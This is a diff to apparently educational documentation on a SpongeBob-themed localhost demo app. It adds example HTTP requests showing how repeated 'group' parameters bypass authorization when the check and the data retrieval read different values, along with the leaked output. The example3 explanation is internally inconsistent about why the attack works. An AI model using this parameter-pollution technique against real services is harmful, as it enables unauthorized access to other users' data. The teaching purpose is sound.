@@ -52,23 +52,55 @@ def check_group_membership(f):
 
 ```shell
 @base = http://localhost:8000/ii/multi-value-semantics
-### Expected usage: Mr. Krabs is an admin of the staff group and should be able to access the group messages
+
+### Expected usage: Mr. Krabs accesses his staff group messages
 POST {{base}}/example1
 Content-Type: application/x-www-form-urlencoded
 
 user=mr.krabs@krusty-krab.sea&password=$$$money$$$&group=staff@krusty-krab.sea
+
+# Results in 200 OK - Mr. Krabs sees his group's messages:
+#
+# [
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
+#   }
+# ]
+
 ###
-# Plankton is able to access his own group's messages
+
+### Plankton can access his own group's messages
 POST {{base}}/example1
 Content-Type: application/x-www-form-urlencoded
 
 user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea
+
+# Results in 200 OK:
+#
+# [
+#   {
+#     "from": "plankton@chum-bucket.sea",
+#     "message": "To my future self, don't forget to steal the formula!"
+#   }
+# ]
+
 ###
-# But Plankton is not able to access the Krusty Krab's messages
+
+### SECURE: Plankton cannot access Krusty Krab messages by providing multiple group values
 POST {{base}}/example1
 Content-Type: application/x-www-form-urlencoded
 
 user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea&group=staff@krusty-krab.sea
+
+# Results in 403 Forbidden:
+#
+# Forbidden: not a member of the requested group
+#
+# SECURE: This example correctly handles multi-value parameters. Both the
+# authorization check and data retrieval consistently use the FIRST value
+# (staff@chum-bucket.sea), so Plankton cannot bypass the authorization by
+# providing multiple group values.
 ```
 
 </details>
@@ -100,23 +132,74 @@ def example2():
 
 ```shell
 @base = http://localhost:8000/ii/multi-value-semantics
-### Expected usage: Mr. Krabs is an admin of the staff group and should be able to access the group messages
+
+### Expected usage: Mr. Krabs accesses multiple groups he administers
 POST {{base}}/example2
 Content-Type: application/x-www-form-urlencoded
 
 user=mr.krabs@krusty-krab.sea&password=$$$money$$$&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea
+
+# Results in 200 OK - Mr. Krabs sees combined messages:
+#
+# [
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
+#   },
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
+#   }
+# ]
+
 ###
-# Plankton is able to access his own group's messages
+
+### Plankton can access his own group's messages
 POST {{base}}/example2
 Content-Type: application/x-www-form-urlencoded
 
 user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea
+
+# Results in 200 OK:
+#
+# [
+#   {
+#     "from": "plankton@chum-bucket.sea",
+#     "message": "To my future self, don't forget to steal the formula!"
+#   }
+# ]
+
 ###
-# But now Plankton is able to access the Krusty Krab's messages
+
+### EXPLOIT: Plankton accesses Krusty Krab messages by exploiting multi-value parameter handling
 POST {{base}}/example2
 Content-Type: application/x-www-form-urlencoded
 
 user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea
+
+# Results in sensitive data disclosure:
+#
+# [
+#   {
+#     "from": "plankton@chum-bucket.sea",
+#     "message": "To my future self, don't forget to steal the formula!"
+#   },
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
+#   },
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
+#   }
+# ]
+#
+# IMPACT: Plankton has stolen both the safe password AND the secret formula
+# location and combination! The authorization check uses the FIRST group value
+# (staff@chum-bucket.sea, which Plankton is authorized for), but the message
+# retrieval uses ALL group values (including staff@krusty-krab.sea and
+# managers@krusty-krab.sea). This first/all semantic mismatch allows attackers
+# to pass authorization for their own resources while accessing victim resources.
 ```
 
 </details>
@@ -154,23 +237,74 @@ def check_multi_group_membership(f):
 
 ```shell
 @base = http://localhost:8000/ii/multi-value-semantics
-### Expected usage: Mr. Krabs is an admin of the staff group and should be able to access the group messages
+
+### Expected usage: Mr. Krabs accesses multiple groups he administers
 POST {{base}}/example3
 Content-Type: application/x-www-form-urlencoded
 
 user=mr.krabs@krusty-krab.sea&password=$$$money$$$&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea
+
+# Results in 200 OK - Mr. Krabs sees combined messages:
+#
+# [
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
+#   },
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
+#   }
+# ]
+
 ###
-# Plankton is able to access his own group's messages
+
+### Plankton can access his own group's messages
 POST {{base}}/example3
 Content-Type: application/x-www-form-urlencoded
 
 user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea
+
+# Results in 200 OK:
+#
+# [
+#   {
+#     "from": "plankton@chum-bucket.sea",
+#     "message": "To my future self, don't forget to steal the formula!"
+#   }
+# ]
+
 ###
-# But now Plankton is able to access the Krusty Krab's messages
+
+### EXPLOIT: Plankton exploits last-value authorization against all-values retrieval
 POST {{base}}/example3
 Content-Type: application/x-www-form-urlencoded
 
 user=plankton@chum-bucket.sea&password=burgers-are-yummy&group=staff@chum-bucket.sea&group=staff@krusty-krab.sea&group=managers@krusty-krab.sea
+
+# Results in sensitive data disclosure:
+#
+# [
+#   {
+#     "from": "plankton@chum-bucket.sea",
+#     "message": "To my future self, don't forget to steal the formula!"
+#   },
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "I am updating the safe password to '123456'. Do not tell anyone!"
+#   },
+#   {
+#     "from": "mr.krabs@krusty-krab.sea",
+#     "message": "The secret formula is stored in the safe. Combination: rotate right 3 times to 12, left 2 times to 7, right once to 23."
+#   }
+# ]
+#
+# IMPACT: Plankton steals the complete secret formula heist plan - safe password,
+# location, AND combination! This variant is even more subtle than example 2:
+# the authorization check uses the LAST group value (managers@krusty-krab.sea),
+# sees it fails, but the message retrieval still processes ALL values. The
+# last/all semantic mismatch combined with failed authorization still allowing
+# data access demonstrates how multi-value semantics create complex attack surfaces.
 ```
 
 </details>
